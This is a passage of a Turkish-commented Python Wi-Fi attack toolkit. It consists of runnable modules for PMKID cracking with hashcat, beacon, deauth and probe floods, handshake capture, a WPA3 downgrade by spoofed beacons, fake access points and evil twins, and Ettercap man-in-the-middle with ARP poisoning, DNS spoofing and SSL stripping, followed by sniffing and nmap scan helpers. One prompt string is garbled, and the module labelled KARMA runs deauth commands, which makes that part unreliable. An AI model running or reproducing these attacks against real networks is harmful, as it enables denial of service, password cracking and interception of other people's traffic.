                print(f"    hashcat -m 16800 {hash_file} -a 3 ?d?d?d?d?d?d?d?d")
                
                # Tek tuşla kırma
                kr = input(c(Colors.OKCYAN, "[?] Şimdi kırmak ister misiniz? (e/h): "))
                if kr.lower() == 'e':
                    wl = input(c(Colors.OKCYAN, "[?] Wordlist: "))
                    if not wl:
                        wl = "/usr/share/wordlists/rockyou.txt"
                    if os.path.exists(wl):
                        os.system(f"hashcat -m 16800 {hash_file} {wl} --force 2>/dev/null")
                        os.system(f"hashcat -m 16800 {hash_file} --show 2>/dev/null")
            else:
                print(c(Colors.WARNING, "\n[!] PMKID alınamadı."))
        else:
            print(c(Colors.WARNING, "\n[!] Hash dosyası oluşturulamadı."))
        
        # Temizlik
        os.remove(f"{output_file}.pcapng")
    else:
        print(c(Colors.FAIL, "\n[!] PMKID toplanamadı!"))
        print(c(Colors.WARNING, "[*] İpucu: AP'nin WPA3 veya WPA2 kullandığından emin olun."))
    
    if bssid and os.path.exists(filter_file):
        os.remove(filter_file)
    
    report_mgr.add('PMKID', {'bssid': bssid, 'channel': channel})
    return True

# ============================================================
# HACK MODUL 7: Beacon Flood
# ============================================================

def hack_beacon_flood(mon_iface: str):
    """Sahte AP ile beacon flood saldırısı"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [H7] BEACON FLOOD SALDIRISI"))
    print(c(Colors.HEADER, "=" * 70))
    
    channel = input(c(Colors.OKCYAN, "[?] Kanal (boş=tümü): "))
    count = input(c(Colors.OKCYAN, "[?] AP sayısı (boş=500): "))
    count = int(count) if count else 500
    
    prefix = input(c(Colors.OKCYAN, "[?] SSID öneki (boş=FreeWiFi): "))
    prefix = prefix if prefix else "FreeWiFi"
    
    print(c(Colors.WARNING, f"\n[!] {count} sahte AP oluşturuluyor..."))
    print(c(Colors.WARNING, "[*] Bu ortamdaki tüm Wi-Fi taramalarını bozacak!"))
    print(c(Colors.WARNING, "[*] Durdurmak için Ctrl+C\n"))
    
    try:
        from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11EltRSN, sendp
    except ImportError:
        print(c(Colors.FAIL, "[!] Scapy gerekli!"))
        return False
    
    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")
    
    bssid_base = [random.randint(0, 255) for _ in range(6)]
    bssid_base[0] = (bssid_base[0] & 0xFC) | 0x02  # locally administered
    
    packets = []
    for i in range(count):
        bssid = ":".join(f"{b:02x}" for b in bssid_base)
        bssid_base[-1] = (bssid_base[-1] + 1) % 256
        if bssid_base[-1] == 0:
            bssid_base[-2] = (bssid_base[-2] + 1) % 256
        
        ssid = f"{prefix}_{random.randint(1000, 9999)}"
        chan = int(channel) if channel else random.choice([1,6,11,36,40,44,48])
        
        # Kanal kontrolü
        chan_ie_bytes = struct.pack('BB', 3, chan)
        
        pkt = RadioTap() / Dot11(
            addr1="ff:ff:ff:ff:ff:ff",
            addr2=bssid,
            addr3=bssid
        ) / Dot11Beacon(cap="ESS+privacy") / Dot11Elt(
            ID="SSID", info=ssid, len=len(ssid)
        ) / Dot11EltRSN(
            group_cipher_suite=0x04AC0F,
            pairwise_cipher_suites=[0x04AC0F],
            akm_suites=[0x02AC0F]
        ) / Dot11Elt(ID="DSset", info=chan_ie_bytes)
        
        packets.append(pkt)
    
    print(c(Colors.OKGREEN, f"[+] {len(packets)} beacon frame hazır. Gönderiliyor..."))
    
    try:
        sent = 0
        while True:
            for pkt in packets[:50]:  # Her döngüde 50 AP
                sendp(pkt, iface=mon_iface, verbose=0)
                sent += 1
            print(f"\r[*] Gönderilen beacon: {sent}", end='', flush=True)
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(c(Colors.WARNING, f"\n[!] Saldırı durduruldu. Toplam: {sent} beacon"))
    
    report_mgr.add('Beacon_Flood', {'count': count, 'prefix': prefix})
    return True

# ============================================================
# HACK MODUL 8: Deauth Flood
# ============================================================

def hack_deauth_flood(mon_iface: str):
    """Sürekli deauth paketi gönderme"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [H8] DEAUTH FLOOD SALDIRISI"))
    print(c(Colors.HEADER, "=" * 70))
    
    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID (boş=yayın): "))
    client = input(c(Colors.OKCYAN, "[?] İstemci MAC (boş=tümü): "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal: "))
    reason = input(c(Colors.OKCYAN, "[?] Reason code (boş=7): "))
    reason = int(reason) if reason else 7
    
    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")
    
    print(c(Colors.WARNING, f"\n[!] Deauth flood başlatılıyor (reason={reason})..."))
    print(c(Colors.WARNING, "[*] Durdurmak için Ctrl+C\n"))
    
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    except ImportError:
        # Fallback to aireplay-ng
        print(c(Colors.OKCYAN, "[*] aireplay-ng ile deauth..."))
        if bssid:
            os.system(f"aireplay-ng -0 0 -a {bssid} {mon_iface}")
        return True
    
    # Scapy ile yüksek hızlı deauth
    if client:
        pkt = RadioTap() / Dot11(
            addr1=client, addr2=bssid or "ff:ff:ff:ff:ff:ff", 
            addr3=bssid or "ff:ff:ff:ff:ff:ff"
        ) / Dot11Deauth(reason=reason)
    else:
        pkt = RadioTap() / Dot11(
            addr1="ff:ff:ff:ff:ff:ff", addr2=bssid or "ff:ff:ff:ff:ff:ff",
            addr3=bssid or "ff:ff:ff:ff:ff:ff"
        ) / Dot11Deauth(reason=reason)
    
    try:
        count = 0
        while True:
            sendp(pkt, iface=mon_iface, verbose=0, count=100)
            count += 100
            print(f"\r[*] Gönderilen deauth: {count}", end='', flush=True)
    except KeyboardInterrupt:
        print(c(Colors.WARNING, f"\n[!] Durduruldu. Toplam: {count} deauth paketi"))
    
    report_mgr.add('Deauth_Flood', {'bssid': bssid, 'client': client, 'reason': reason})
    return True

# ============================================================
# HACK MODUL 9: Probe Request Flood
# ============================================================

def hack_probe_request_flood(mon_iface: str):
    """Probe request flood - AP'leri bunalt"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [H9] PROBE REQUEST FLOOD"))
    print(c(Colors.HEADER, "=" * 70))
    
    print(c(Colors.WARNING, "[!] Bu saldırı AP'lerin probe response ile dolmasına neden olur."))
    
    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID (boş=yayın): "))
    ssid_list = input(c(Colors.OKCYAN, "[?] SSID listesi (virgülle ayır, boş=rastgele): "))
    
    ssids = [s.strip() for s in ssid_list.split(',')] if ssid_list else []
    if not ssids:
        ssids = [f"NETWORK_{random.randint(1000,9999)}" for _ in range(20)]
    
    print(c(Colors.OKCYAN, f"\n[*] {len(ssids)} farklı SSID ile probe request gönderiliyor..."))
    print(c(Colors.WARNING, "[*] Durdurmak için Ctrl+C\n"))
    
    try:
        from scapy.all import RadioTap, Dot11, Dot11ProbeReq, Dot11Elt, sendp
    except ImportError:
        print(c(Colors.FAIL, "[!] Scapy gerekli!"))
        return False
    
    # Rastgele MAC
    def random_mac():
        return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
    
    try:
        count = 0
        while True:
            src_mac = random_mac()
            ssid = random.choice(ssids)
            
            pkt = RadioTap() / Dot11(
                addr1=bssid or "ff:ff:ff:ff:ff:ff",
                addr2=src_mac,
                addr3=bssid or "ff:ff:ff:ff:ff:ff"
            ) / Dot11ProbeReq() / Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
            
            sendp(pkt, iface=mon_iface, verbose=0)
            count += 1
            
            if count % 100 == 0:
                print(f"\r[*] Gönderilen probe request: {count}", end='', flush=True)
    except KeyboardInterrupt:
        print(c(Colors.WARNING, f"\n[!] Durduruldu. Toplam: {count} probe"))
    
    report_mgr.add('Probe_Flood', {'bssid': bssid})
    return True

# ============================================================
# HACK MODUL 10: EAPOL Log Toplayıcı
# ============================================================

def hack_eapol_capture(mon_iface: str):
    """EAPOL 4-way handshake paketlerini kaydet"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [H10] EAPOL LOG TOPLAYICI"))
    print(c(Colors.HEADER, "=" * 70))
    
    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID (boş=tümü): "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal: "))
    duration = input(c(Colors.OKCYAN, "[?] Süre (saniye, boş=60): "))
    duration = int(duration) if duration else 60
    
    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")
    
    output = f"/tmp/eapol_{int(time.time())}.pcap"
    
    print(c(Colors.OKCYAN, f"\n[*] {duration}s boyunca EAPOL paketleri toplanıyor..."))
    
    # tshark veya tcpdump ile filtrele
    if bssid:
        filter_exp = f"wlan.bssid == {bssid} && eapol"
        cmd = f"tshark -i {mon_iface} -Y '{filter_exp}' -a duration:{duration} -w {output} 2>/dev/null"
    else:
        cmd = f"tshark -i {mon_iface} -Y 'eapol' -a duration:{duration} -w {output} 2>/dev/null"
    
    run_command(cmd, timeout=duration + 10)
    
    if os.path.exists(output) and os.path.getsize(output) > 0:
        print(c(Colors.OKGREEN, f"\n[+] ✓ EAPOL paketleri kaydedildi: {output}"))
        print(c(Colors.OKGREEN, f"    Boyut: {os.path.getsize(output)} bytes"))
        
        # Paket sayısını göster
        ret, out, _ = run_command(f"tshark -r {output} -Y eapol 2>/dev/null | wc -l")
        print(c(Colors.OKBLUE, f"    EAPOL paketi: {out.strip() or 'N/A'}"))
    else:
        print(c(Colors.FAIL, "\n[!] EAPOL paketi yakalanamadı!"))
    
    report_mgr.add('EAPOL_Capture', {'bssid': bssid, 'duration': duration, 
                                      'output': output if os.path.exists(output) else None})
    return True

# ============================================================
# HACK MODUL 11: KARMA Saldırısı
# ============================================================

def hack_karma(mon_iface: str):
    """KARMA saldırısı - probe request'lere yanıt ver"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [H11] KARMA SALDIRISI"))
    print(c(Colors.HEADER, "=" * 70))
    
    print(c(Colors.OKCYAN, "[*] KARMA: Cihazların geçmiş ağlarına sahte AP yanıtı verir."))
    print(c(Colors.OKCYAN, "[*] Cihaz otomatik olarak bağlanır.\n"))
    
    interface = input(c(Colors.OKCYAN, "[?] İnternet arayüzü (ör: eth0): "))
    
    print(c(Colors.WARNING, "\n[1] manafactured ne ol) KARMA saldırısı başlatılıyor..."))
    print(c(Colors.WARNING, "[*] bettercap ile KARMA çalıştırılıyor..."))
    
    # Bettercap KARMA modülü
    cmd = f"bettercap -eval 'set wifi.interface {mon_iface}; wifi.recon on; wifi.show; sleep 1; wifi.assoc all; wifi.deauth all;'"
    
    print(c(Colors.OKCYAN, f"\n[*] Çalıştırılıyor: bettercap KARMA..."))
    print(c(Colors.WARNING, "[*] 60 saniye çalışacak..."))
    
    proc = subprocess.Popen(
        f"timeout 60 {cmd}",
        shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    
    try:
        stdout, stderr = proc.communicate(timeout=65)
        print(c(Colors.OKBLUE, f"\n[*] Bettercap çıktısı:"))
        for line in stdout.decode().split('\n')[-20:]:
            if line.strip():
                print(f"  {line[:120]}")
    except subprocess.TimeoutExpired:
        proc.kill()
    
    report_mgr.add('KARMA', {'interface': interface})
    return True

# ============================================================
# HACK MODUL 12: WPA3 Downgrade
# ============================================================

def hack_wpa3_downgrade(mon_iface: str):
    """WPA3'ü WPA2'ye düşürme"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [H12] WPA3 DOWNGRADE SALDIRISI"))
    print(c(Colors.HEADER, "=" * 70))
    
    print(c(Colors.OKCYAN, "[*] WPA3 -> WPA2 düşürme: AP WPA3 desteklese bile"))
    print(c(Colors.OKCYAN, "    WPA2 handshake zorlanır.\n"))
    
    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID: "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal: "))
    
    if not bssid or len(bssid) != 17:
        print(c(Colors.FAIL, "[!] Geçerli BSSID girin!"))
        return False
    
    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")
    
    print(c(Colors.WARNING, "[*] Beacon frame'lerde WPA3 bilgisini kaldır..."))
    print(c(Colors.WARNING, "[*] (Prensip: AP'nin beacon'ını taklit ederek WPA2 göster)"))
    
    try:
        from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11EltRSN, sendp, sniff
    except ImportError:
        print(c(Colors.FAIL, "[!] Scapy gerekli!"))
        return False
    
    print(c(Colors.OKCYAN, "\n[*] Orijinal beacon yakalanıyor (5 saniye)..."))
    
    original_beacons = []
    def collect_beacon(pkt):
        if pkt.haslayer(Dot11Beacon):
            if pkt.addr2 and pkt.addr2 == bssid:
                original_beacons.append(pkt)
    
    sniff(iface=mon_iface, prn=collect_beacon, timeout=10, store=0)
    
    if original_beacons:
        print(c(Colors.OKGREEN, f"[+] {len(original_beacons)} beacon yakalandı! WPA2 spoof beacon gönderiliyor..."))
        
        # WPA2 RSN bilgisi
        rsn = Dot11EltRSN(
            group_cipher_suite=0x04AC0F,  # CCMP
            pairwise_cipher_suites=[0x04AC0F],
            akm_suites=[0x02AC0F]  # PSK
        )
        
        try:
            count = 0
            while True:
                for beacon in original_beacons[:3]:
                    # WPA2 spoof beacon
                    ssid_elt = None
                    for elt in beacon[Dot11Beacon]:
                        if isinstance(elt, Dot11Elt) and elt.ID == 0:
                            ssid_elt = elt
                            break
                    
                    if ssid_elt:
                        spkt = RadioTap() / Dot11(
                            addr1="ff:ff:ff:ff:ff:ff",
                            addr2=bssid, addr3=bssid
                        ) / Dot11Beacon(cap="ESS+privacy") / ssid_elt / rsn
                        
                        sendp(spkt, iface=mon_iface, verbose=0)
                        count += 1
                
                print(f"\r[*] Sahte WPA2 beacon: {count}", end='', flush=True)
                time.sleep(0.1)
        except KeyboardInterrupt:
            print(c(Colors.WARNING, f"\n[!] Durduruldu. Toplam: {count}"))
    else:
        print(c(Colors.FAIL, "[!] Hedeften beacon alınamadı!"))
    
    report_mgr.add('WPA3_Downgrade', {'bssid': bssid})
    return True

# ============================================================
# HACK MODUL 13: Beacon Frame Injection
# ============================================================

def hack_beacon_inject(mon_iface: str):
    """Özelleştirilmiş beacon frame enjeksiyonu"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [H13] BEACON FRAME INJECTION"))
    print(c(Colors.HEADER, "=" * 70))
    
    ssid = input(c(Colors.OKCYAN, "[?] SSID: "))
    bssid = input(c(Colors.OKCYAN, "[?] BSSID (boş=rastgele): "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal: "))
    
    if not ssid:
        print(c(Colors.FAIL, "[!] SSID gerekli!"))
        return False
    
    if not bssid:
        bssid = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
        bssid = (bssid[:14] + "2" + bssid[15:])  # Locally administered
    
    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")
    
    print(c(Colors.OKCYAN, f"\n[*] Sahte AP oluşturuluyor: {ssid} ({bssid})"))
    print(c(Colors.WARNING, "[*] Durdurmak için Ctrl+C\n"))
    
    try:
        from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11EltRSN, sendp
    except ImportError:
        print(c(Colors.FAIL, "[!] Scapy gerekli!"))
        return False
    
    chan_ie = struct.pack('BB', 3, int(channel) if channel else 6)
    
    pkt = RadioTap() / Dot11(
        addr1="ff:ff:ff:ff:ff:ff",
        addr2=bssid, addr3=bssid
    ) / Dot11Beacon(cap="ESS+privacy") / Dot11Elt(
        ID="SSID", info=ssid, len=len(ssid)
    ) / Dot11EltRSN(
        group_cipher_suite=0x04AC0F,
        pairwise_cipher_suites=[0x04AC0F],
        akm_suites=[0x02AC0F]
    ) / Dot11Elt(ID="DSset", info=chan_ie)
    
    try:
        count = 0
        while True:
            sendp(pkt, iface=mon_iface, verbose=0, count=10)
            count += 10
            print(f"\r[*] Beacon gönderiliyor: {count}", end='', flush=True)
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(c(Colors.WARNING, f"\n[!] Durduruldu. Toplam: {count}"))
    
    report_mgr.add('Beacon_Inject', {'ssid': ssid, 'bssid': bssid})
    return True

# ============================================================
# HACK MODUL 14: Bettercap WiFi Hack
# ============================================================

def hack_bettercap_wifi(mon_iface: str):
    """Bettercap ile WiFi saldırıları"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [H14] BETTARCAP WiFi HACK MODÜLÜ"))
    print(c(Colors.HEADER, "=" * 70))
    
    print(c(Colors.OKCYAN, "\n[*] Bettercap WiFi saldırı seçenekleri:"))
    print("  1 - WiFi recon (ağ taraması)")
    print("  2 - Deauth saldırısı (tüm istemciler)")
    print("  3 - Deauth saldırısı (seçili istemci)")
    print("  4 - PMKID toplama")
    print("  5 - Probe request yakalama")
    print("  6 - WiFi AP spoofing (Evil Twin)")
    print("  7 - KARMA saldırısı")
    print("  8 - TickTock (beacon flood)")
    
    choice = input(c(Colors.OKCYAN, "[?] Seçim (1-8): "))
    
    cmds = {
        '1': f"wifi.recon on; sleep 10; wifi.show",
        '2': f"wifi.recon on; sleep 3; wifi.deauth all",
        '3': f"wifi.recon on; sleep 3; wifi.deauth STA_MAC",
        '4': f"wifi.recon on; sleep 10; wifi.assoc all",
        '5': f"wifi.recon on; sleep 10; wifi.show.stations",
        '6': f"wifi.ap.create SSID {mon_iface}",
        '7': f"wifi.recon on; wifi.ap.karma on; sleep 20",
        '8': f"wifi.recon on; wifi.ap.beacon.flood on; sleep 10"
    }
    
    cmd = cmds.get(choice, 'wifi.recon on; sleep 10; wifi.show')
    
    if choice == '3':
        sta = input(c(Colors.OKCYAN, "[?] İstemci MAC: "))
        cmd = cmd.replace('STA_MAC', sta)
    
    if choice == '6':
        ssid = input(c(Colors.OKCYAN, "[?] SSID: "))
        cmd = cmd.replace('SSID', ssid)
    
    print(c(Colors.OKCYAN, f"\n[*] Bettercap çalıştırılıyor..."))
    print(c(Colors.WARNING, "[*] Çıktı bekleniyor...\n"))
    
    bettercap_cmd = f"bettercap -eval '{cmd}' -no-colors 2>/dev/null"
    ret, out, err = run_command(bettercap_cmd, timeout=30)
    
    if out:
        print(c(Colors.OKBLUE, "[*] Bettercap çıktısı:"))
        for line in out.split('\n')[-30:]:
            if line.strip():
                print(f"  {line[:140]}")
    
    report_mgr.add('Bettercap_WiFi', {'choice': choice})
    return True

# ============================================================
# HACK MODUL 15: Ettercap WiFi MITM
# ============================================================

def hack_ettercap_wifi():
    """Ettercap ile WiFi MITM"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [H15] ETTERCAP WiFi MITM"))
    print(c(Colors.HEADER, "=" * 70))
    
    interface = input(c(Colors.OKCYAN, "[?] Arayüz: "))
    target1 = input(c(Colors.OKCYAN, "[?] Hedef 1 IP (gateway): "))
    target2 = input(c(Colors.OKCYAN, "[?] Hedef 2 IP (kurban): "))
    
    if not interface:
        interfaces = get_all_interfaces()
        interface = interfaces[0] if interfaces else "eth0"
    
    print(c(Colors.OKCYAN, "\n[*] Ettercap saldırı seçenekleri:"))
    print("  1 - ARP poisoning (klasik MITM)")
    print("  2 - DNS spoofing")
    print("  3 - DHCP spoofing")
    print("  4 - SSL stripping (HTTPS düşürme)")
    print("  5 - Port stealing")
    print("  6 - Tümü (ARP + DNS + SSL)")
    
    choice = input(c(Colors.OKCYAN, "[?] Seçim (1-6): "))
    
    etter_filters = {
        '1': 'arp_poison',
        '2': 'dns_spoof',
        '3': 'dhcp_spoof',
        '4': 'sslstrip',
        '5': 'port_steal',
        '6': 'arp_poison+dns_spoof+sslstrip'
    }
    
    filter_name = etter_filters.get(choice, 'arp_poison')
    
    # Etterfilter derle ve çalıştır
    if choice == '2' or choice == '6':
        # DNS spoofing için host dosyası
        dns_file = "/tmp/ettercap_dns.txt"
        with open(dns_file, 'w') as f:
            f.write("# Ettercap DNS spoof\n* A 192.168.99.1\n* AAAA ::1\n")
    
    print(c(Colors.WARNING, f"\n[*] Ettercap MITM başlatılıyor ({filter_name})..."))
    print(c(Colors.WARNING, "[*] Durdurmak için: pkill ettercap\n"))
    
    if target1 and target2:
        # İkili hedef
        etter_cmd = f"ettercap -T -M arp:remote -i {interface} /{target1}// /{target2}//"
    else:
        etter_cmd = f"ettercap -T -M arp:remote -i {interface} // //"
    
    # Seçime göre plugin ekle
    if choice == '2':
        etter_cmd += " -P dns_spoof"
    elif choice == '3':
        etter_cmd += " -P dhcp_spoof"
    elif choice == '4':
        etter_cmd += " -P sslstrip"
    
    if choice == '6':
        etter_cmd += " -P dns_spoof -P sslstrip"
    
    print(c(Colors.OKBLUE, f"[*] Çalıştırılıyor: {etter_cmd}"))
    print(c(Colors.WARNING, "[*] 30 saniye çalışacak..."))
    
    proc = subprocess.Popen(
        f"timeout 30 {etter_cmd}",
        shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    
    try:
        stdout, stderr = proc.communicate(timeout=35)
        print(c(Colors.OKBLUE, "\n[*] Ettercap çıktısı:"))
        for line in stdout.decode(errors='ignore').split('\n')[-20:]:
            if line.strip():
                print(f"  {line[:120]}")
    except subprocess.TimeoutExpired:
        proc.kill()
    
    report_mgr.add('Ettercap_MITM', {'target1': target1, 'target2': target2, 
                                      'filter': filter_name})
    return True

# ============================================================
# GUVENLIK MODUL 1: Bettercap MITM Framework
# ============================================================

def sec_bettercap_mitm():
    """Bettercap ile güvenlik testi framework'ü"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S1] BETTARCAP MITM GÜVENLİK FRAMEWORK'Ü"))
    print(c(Colors.HEADER, "=" * 70))
    
    interface = input(c(Colors.OKCYAN, "[?] Arayüz (boş=otomatik): "))
    if not interface:
        interfaces = get_all_interfaces()
        interface = interfaces[0] if interfaces else "eth0"
    
    print(c(Colors.OKCYAN, "\n[*] Bettercap güvenlik modülleri:"))
    print("  1 - ARP spoofing tespiti")
    print("  2 - Ağ taraması (net.probe)")
    print("  3 - HTTP/HTTPS trafik analizi")
    print("  4 - Sniffle (sniffer)")
    print("  5 - JQ (JSON query) ile akıllı analiz")
    print("  6 - SSL/TLS analizi")
    print("  7 - TickTock (saat farkı analizi)")
    print("  8 - Tüm güvenlik kontrolleri")
    
    choice = input(c(Colors.OKCYAN, "[?] Seçim (1-8): "))
    
    bcap_cmds = {
        '1': "net.sniff on; set arp.spoof.internal true; sleep 10; net.show",
        '2': "net.probe on; sleep 10; net.show",
        '3': "net.sniff on; set net.sniff.verbose true; sleep 15",
        '4': "net.sniff on; set net.sniff.output /tmp/sniff.pcap; sleep 20",
        '5': "net.probe on; sleep 10; net.show",
        '6': "net.sniff on; set net.sniff.filter tcp port 443; sleep 15",
        '7': "net.probe on; sleep 5; ticktock",
        '8': "net.probe on; net.sniff on; sleep 20; net.show"
    }
    
    cmd = bcap_cmds.get(choice, "net.probe on; sleep 10; net.show")
    
    print(c(Colors.OKCYAN, f"\n[*] Bettercap güvenlik taraması başlatılıyor..."))
    
    full_cmd = f"bettercap -iface {interface} -eval '{cmd}' -no-colors 2>/dev/null"
    ret, out, err = run_command(full_cmd, timeout=40)
    
    if out:
        print(c(Colors.OKBLUE, "\n[*] Tarama sonuçları:"))
        for line in out.split('\n')[-40:]:
            if line.strip() and ('detected' in line.lower() or 'found' in line.lower() 
                                or 'captured' in line.lower() or 'alert' in line.lower()
                                or line.startswith('[')):
                print(f"  {line[:140]}")
    
    report_mgr.add('Bettercap_MITM', {'interface': interface, 'module': choice})
    return True

# ============================================================
# GUVENLIK MODUL 2: Ettercap MITM Framework
# ============================================================

def sec_ettercap_mitm():
    """Ettercap ile MITM güvenlik testi"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S2] ETTERCAP MITM GÜVENLİK FRAMEWORK'Ü"))
    print(c(Colors.HEADER, "=" * 70))
    
    interface = input(c(Colors.OKCYAN, "[?] Arayüz: "))
    if not interface:
        interfaces = get_all_interfaces()
        interface = interfaces[0] if interfaces else "eth0"
    
    print(c(Colors.OKCYAN, "\n[*] Ettercap güvenlik testleri:"))
    print("  1 - Ağdaki açık portları tespit et")
    print("  2 - ARP tablosu analizi")
    print("  3 - DNS sorgu loglama")
    print("  4 - HTTP trafiği analizi")
    print("  5 - MAC vendor analizi")
    print("  6 - Tüm protokol analizi")
    
    choice = input(c(Colors.OKCYAN, "[?] Seçim (1-6): "))
    
    # Pasif dinleme
    duration = input(c(Colors.OKCYAN, "[?] Süre (saniye, boş=20): "))
    duration = int(duration) if duration else 20
    
    print(c(Colors.OKCYAN, f"\n[*] {duration}s pasif analiz başlatılıyor..."))
    
    # tcpdump/tshark ile pasif analiz
    output = f"/tmp/etter_analysis_{int(time.time())}.pcap"
    
    filters = {
        '1': 'tcp',
        '2': 'arp',
        '3': 'port 53',
        '4': 'tcp port 80',
        '5': 'ether',
        '6': ''
    }
    
    bpf = filters.get(choice, '')
    
    if bpf:
        cmd = f"timeout {duration} tshark -i {interface} -f '{bpf}' -w {output} 2>/dev/null"
    else:
        cmd = f"timeout {duration} tshark -i {interface} -w {output} 2>/dev/null"
    
    run_command(cmd, timeout=duration + 5)
    
    if os.path.exists(output) and os.path.getsize(output) > 0:
        print(c(Colors.OKGREEN, f"\n[+] ✓ {os.path.getsize(output)} byte veri yakalandı"))
        
        # Özet
        ret, out, _ = run_command(f"capinfos {output} 2>/dev/null | head -15")
        if out:
            print(c(Colors.OKBLUE, "\n[*] Yakalanan trafik özeti:"))
            print(out[:500])
        
        # Protokol analizi
        ret, out, _ = run_command(f"tshark -r {output} -qz io,phs 2>/dev/null")
        if out:
            print(c(Colors.OKBLUE, "\n[*] Protokol hiyerarşisi:"))
            print(out[:500])
    else:
        print(c(Colors.FAIL, "[!] Veri yakalanamadı!"))
    
    report_mgr.add('Ettercap_Detection', {'interface': interface, 'duration': duration})
    return True

# ============================================================
# GUVENLIK MODUL 3: Port Tarama (Nmap entegre)
# ============================================================

def sec_port_scan():
    """Nmap ile port tarama"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S3] PORT TARAMA (NMAP ENTEGRE)"))
    print(c(Colors.HEADER, "=" * 70))
    
    target = input(c(Colors.OKCYAN, "[?] Hedef (IP veya domain): "))
    if not target:
        print(c(Colors.FAIL, "[!] Hedef gerekli!"))
        return []
    
    print(c(Colors.OKCYAN, "\n[*] Tarama seçenekleri:"))
    print("  1 - Hızlı tarama (top 100 port)")
    print("  2 - Detaylı tarama (versiyon + OS)")
    print("  3 - Servis taraması (versiyon)")
    print("  4 - Full port tarama (1-65535)")
    print("  5 - UDP tarama")
    print("  6 - Güvenlik duvarı tespiti")
    print("  7 - Script taraması (vuln)")
    
    choice = input(c(Colors.OKCYAN, "[?] Seçim (1-7): "))
    
    nmap_cmds = {
        '1': f"nmap -sS -T4 --top-ports 100 {target}",
        '2': f"nmap -sS -sV -O -T4 --top-ports 200 {target}",
        '3': f"nmap -sV -T4 --version-intensity 9 -p 1-10000 {target}",
        '4': f"nmap -sS -T4 -p- {target}",
        '5': f"nmap -sU -T4 --top-ports 50 {target}",
        '6': f"nmap -sS -T4 -A --reason {target}",
        '7': f"nmap -sS -sV --script=vuln -T4 --top-ports 200 {target}"
    }
    
    cmd = nmap_cmds.get(choice, nmap_cmds['1'])
    
    print(c(Colors.OKCYAN, f"\n[*] Nmap çalıştırılıyor: {target}"))
    print(c(Colors.WARNING, "[*] Bu işlem birkaç dakika sürebilir...\n"))
    
    os.system(cmd)
    
    report_mgr.add('Port_Scan_Nmap', {'target': target, 'scan_type': choice})
    return True

# ============================================================
# GUVENLIK MODUL 4: Ağ Trafiği Dinleme & Analiz (Gelişmiş)
# ============================================================

def sec_traffic_monitor(interface: str):
    """Gelişmiş ağ trafiği dinleme ve analiz"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S4] AĞ TRAFİĞİ DİNLEME & ANALİZ"))
    print(c(Colors.HEADER, "=" * 70))
    
    if not interface:
        interfaces = get_all_interfaces()
        print(c(Colors.OKBLUE, "\n[*] Mevcut arayüzler:"))
        for i, iface in enumerate(interfaces):
            print(f"  {i+1} - {iface}")
        choice = input(c(Colors.OKCYAN, "\n[?] Arayüz seçin: "))
        try:
            interface = interfaces[int(choice)-1]
        except:
            interface = interfaces[0] if interfaces else "eth0"
    
    print(c(Colors.OKCYAN, "\n[*] Dinleme seçenekleri:"))
    print("  1 - Hızlı analiz (30 sn, tüm protokoller)")
    print("  2 - HTTP trafiği (80/8080)")
    print("  3 - DNS sorguları")
    print("  4 - DHCP istekleri")
    print("  5 - ARP trafiği")
    print("  6 - TLS/SSL sertifika analizi")
    print("  7 - Sürekli dinleme (Ctrl+C durdur)")
    print("  8 - ICMP/ping analizi")
    
    choice = input(c(Colors.OKCYAN, "[?] Seçim (1-8): "))
    
    try:
        from scapy.all import sniff, Ether, IP, TCP, UDP, DNS, DHCP, ARP, Raw, TLS
    except ImportError:
        print(c(Colors.WARNING, "[!] Scapy yükleniyor..."))
        os.system("pip3 install scapy 2>/dev/null")
        from scapy.all import sniff, Ether, IP, TCP, UDP, DNS, DHCP, ARP, Raw
    
    stats = {
        'total': 0, 'tcp': 0, 'udp': 0, 'dns': 0, 'dhcp': 0,
        'http': 0, 'https': 0, 'arp': 0, 'icmp': 0, 'other': 0,
        'unique_ips': set(), 'urls': [], 'dns_queries': [],
        'dhcp_discover': [], 'arp_packets': [],
        'ip_proto_count': Counter(),
        'port_count': Counter(),
        'bytes': 0
    }
    
    start_time = time.time()
    
